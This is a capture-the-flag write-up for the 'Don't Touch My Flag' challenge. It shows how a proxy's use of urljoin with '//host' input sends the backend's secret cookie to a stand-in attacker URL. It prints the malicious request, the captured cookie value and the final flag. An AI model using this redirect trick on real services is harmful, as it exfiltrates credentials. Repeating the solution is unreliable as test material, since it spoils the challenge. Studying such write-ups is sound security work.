# Don't Touch My Flag

> I found a flag on a server, though access seems to be protected by a secret. Being generous, I decided to share the flag with you through my proxy server.\
> \
> Oh, the censoring? Sorry about that, I'll remove it after this CTF is over.\
> \
> http://chals.ctf.sg:40101\
> http://chals.ctf.sg:40102\
> \
> author: JustinOng

This challenge consists of two servers - a proxy and a backend.

Let's take a look at how the proxy makes the request to the backend. The secret token is added to the cookies, and a user-controlled `uri` is joined to the backend URL using `urllib.parse.urljoin`.

```python
@app.route("/get")
def get():
    uri = request.args.get("uri", "/")
    full_url = urllib.parse.urljoin(os.environ["BACKEND_URL"], uri)

    r = requests.get(full_url, cookies={
        "secret": secret
    })
    if r.status_code != 200:
        return f"Request failed: received status code {r.status_code}"

    censored = censor(r.text)
    return censored
```

But `urljoin` doesn't fare well when presented with a malformed path.

```python
>>> from urllib.parse import urljoin
>>> urljoin("http://www.example.com", "test")
'http://www.example.com/test'
>>> urljoin("http://www.example.com", "/test")
'http://www.example.com/test'
>>> urljoin("http://www.example.com", "//test")
'http://test'
```

This allows us to get the proxy to make a request to our own server:

```http
GET /get?uri=//ATTACKER-URL HTTP/1.1
Host: chals.ctf.sg:40101
```

In the received request, we get the secret cookie.

```http
GET / HTTP/1.1
Host: ae64-42-60-216-15.ngrok.io
User-Agent: python-requests/2.27.1
Accept: */*
Accept-Encoding: gzip, deflate
Cookie: secret=8byEt7F60cCSRpQs1jeAXQqByOsK5P5b
X-Forwarded-For: 178.128.25.242
X-Forwarded-Proto: http

```

Now we can send a request directly to the backend, which checks our secret before giving us the flag!

```python
@app.route("/flag")
def get_flag():
    if request.cookies.get("secret") != secret:
        return "\N{Black Flag}"

    return flag
```

The flag is `CTFSG{d0nT_toUcH_mY_c00k13s}`
